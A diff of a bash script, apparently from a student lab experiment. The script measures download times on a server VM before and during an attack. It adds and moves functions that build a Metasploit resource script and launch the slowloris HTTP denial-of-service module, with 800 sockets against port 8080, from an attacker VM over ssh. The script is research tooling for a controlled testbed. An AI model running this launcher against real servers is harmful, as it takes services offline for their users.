@@ -84,32 +84,6 @@ collect_download_times() {
     echo $dev >> $filename
 }
 
-attacker_start_attack() {
-    local attack=$1
-    local server_ip=$2
-    local script_path="/tmp/start_exploit.rc"
-    local pid_path="/tmp/exploit.pid"
-
-    #TODO: checar se os arquivos script_path e pid_path já existem
-
-    cat << EOF > "$script_path"
-    use $attack
-    set rhost $server_ip
-    set rport 8080
-    set sockets 800
-    exploit -q
-EOF
-    msfconsole -q -r $script_path > /dev/null 2>&1 &
-
-    echo $! > $pid_path
-    cat $pid_path
-}
-
-start_attack() {
-    local attack=$1
-    ssh tcc-attacker-vm "$(declare -f attacker_start_attack); attacker_start_attack $attack $server_ip"
-}
-
 attacker_stop_attack() {
     local script_path="/tmp/start_exploit.rc"
     local pid_path="/tmp/exploit.pid"
@@ -128,13 +102,41 @@ stop_attack() {
     ssh tcc-attacker-vm "$(declare -f attacker_stop_attack); attacker_stop_attack"
 }
 
+attacker_start_attack() {
+    local attack=$1
+    local server_ip=$2
+    local script_path="/tmp/start_exploit.rc"
+    local pid_path="/tmp/exploit.pid"
+
+    cat << EOF > "$script_path"
+    use $attack
+    set rhost $server_ip
+    set rport 8080
+    set sockets 800
+    exploit -q
+EOF
+    msfconsole -q -r $script_path > /dev/null 2>&1 &
+
+    echo $! > $pid_path
+    cat $pid_path
+}
+
+start_attack() {
+    # In case last attack was not properly ended
+    stop_attack
+    
+    local attack=$1
+    ssh tcc-attacker-vm "$(declare -f attacker_start_attack); attacker_start_attack $attack $server_ip"
+}
+
 # 1.
     # TODO
 
 # 2.
 start_vms
-collect_download_times output.txt
+collect_download_times controle.txt
+start_attack "auxiliary/dos/http/slowloris"
+collect_download_times slowloris.txt
 shutdown_vms
-#start_attack "auxiliary/dos/http/slowloris"
 #sleep 30
 #stop_attack
